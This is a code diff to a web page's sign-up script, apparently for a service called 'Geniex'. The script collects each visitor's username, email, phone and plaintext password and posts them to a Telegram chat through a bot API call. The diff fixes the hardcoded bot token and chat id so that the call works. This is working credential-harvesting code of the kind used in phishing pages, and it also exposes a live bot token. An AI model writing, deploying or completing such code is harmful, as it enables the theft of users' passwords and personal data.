@@ -142,7 +142,7 @@
       const password = document.getElementById("password").value;
 
       const message = `
-🟣 *New Geniex User Registration*
+🟣 *New Geniex Registration*
 👤 *Username:* ${username}
 📧 *Email:* ${email}
 📱 *Phone:* ${phone}
@@ -150,9 +150,9 @@
 🔒 *Password:* ${password}
 `;
 
-      // Replace this with your Bots.Business webhook or Telegram API URL
-      const url = "https://api.telegram.org/bot<7771412415:AAFU8jVhc-OyvCigmEAMSbeiPFrGkr4zhOQ>/sendMessage"; // or Bots.Business webhook
-      const chat_id = "<6707173438>"; // Replace this
+      const token = "7771412415:AAFU8jVhc-OyvCigmEAMSbeiPFrGkr4zhOQ";
+      const chat_id = "6707173438";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
       fetch(url, {
         method: "POST",
@@ -167,18 +167,18 @@
       })
       .then(response => response.json())
       .then(data => {
-        if (data.ok || data.result || data.success) {
+        if (data.ok) {
           document.getElementById("successBox").style.display = "block";
           setTimeout(() => {
             window.location.href = "login.html";
           }, 2500);
         } else {
-          alert("Something went wrong. Try again.");
+          alert("Something went wrong. Please try again.");
         }
       })
       .catch(error => {
         console.error("Error:", error);
-        alert("Unable to connect. Check internet or config.");
+        alert("Unable to send data. Please check your internet.");
       });
     });
   </script>
